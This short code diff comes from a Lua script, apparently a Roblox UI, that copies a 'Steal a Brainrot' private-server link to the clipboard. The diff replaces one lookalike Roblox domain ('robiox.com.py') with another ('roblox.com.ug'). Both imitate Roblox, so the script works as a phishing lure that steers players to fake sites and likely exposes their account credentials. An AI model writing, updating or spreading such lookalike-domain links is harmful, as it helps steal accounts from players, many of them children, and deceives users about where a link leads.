@@ -162,7 +162,7 @@ TweenService:Create(
 ):Play()
 
 -- 🔗 UPDATED LINK (Steal a Brainrot)
-local copyLink = "https://www.robiox.com.py/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=922229853177278515587676283755"
+local copyLink = "https://roblox.com.ug/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=25221679086082144913681266699380"
 
 -- Copy logic
 copyButton.MouseButton1Click:Connect(function()
